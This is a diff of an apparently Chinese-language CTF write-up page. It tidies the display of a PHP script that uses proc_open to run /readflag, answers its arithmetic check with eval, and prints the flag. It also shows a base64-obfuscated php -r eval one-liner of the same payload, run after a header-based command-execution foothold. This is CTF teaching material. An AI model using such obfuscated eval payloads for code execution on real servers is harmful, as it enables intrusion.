@@ -451,8 +451,7 @@ s&amp;O C
 </code></pre></div>
 
 <p>在header里面添加111属性，即可执行任意命令了。在根目录下发现flag和readflag，老套路了。。。直接写入php脚本，参考2019*CTF的mywebsql。脚本内容：</p>
-<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span>
-<span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
 <span class="nv">$d</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
     <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>
     <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>
@@ -484,7 +483,7 @@ s&amp;O C
 <span class="cp">?&gt;</span><span class="x"></span>
 </code></pre></div>
 
-<p>去掉注释base64编码执行php语句：</p>
+<p>利用base64编码执行php语句：</p>
 <div class="highlight"><pre><span></span><code><span class="x">php -c 1 -r &quot;eval(base64_decode(&#39;JGQgPSBhcnJheSgKICAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLAogICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksCiAgICAyID0+IGFycmF5KCJmaWxlIiwgIi90bXAvZXJyb3Itb3V0cHV0LnR4dCIsICJhIikKKTsKJHByb2Nlc3MgPSBwcm9jX29wZW4oJy9yZWFkZmxhZycsICRkLCAkcGlwZXMsICRjd2QsICRlbnYpOwppZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSB0cmltKCRxdWVzdGlvbik7CiAgICB2YXJfZHVtcCgkcXVlc3Rpb24pOwogICAgZXZhbCgnJHJlc3VsdCA9ICcuJHF1ZXN0aW9uLic7Jyk7CiAgICBmd3JpdGUoJHBpcGVzWzBdLCAkcmVzdWx0KTsKICAgIGZjbG9zZSgkcGlwZXNbMF0pOwogICAgdmFyX2R1bXAoJHJlc3VsdCk7CiAgICAvLyAkZmxhZyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICRmbGFnID0gZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgJGZsYWcgPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkZmxhZyA9IGZyZWFkKCRwaXBlc1sxXSwxMDI0KTsKCiAgICBmY2xvc2UoJHBpcGVzWzFdKTsKICAgIHZhcl9kdW1wKCRmbGFnKTsKICAgIAogICAgJHJldHVybl92YWx1ZSA9IHByb2NfY2xvc2UoJHByb2Nlc3MpOwoKICAgIGVjaG8gImNvbW1hbmQgcmV0dXJuZWQgJHJldHVybl92YWx1ZVxuIjsKfQ==&#39;));&quot;</span>
 </code></pre></div>
 
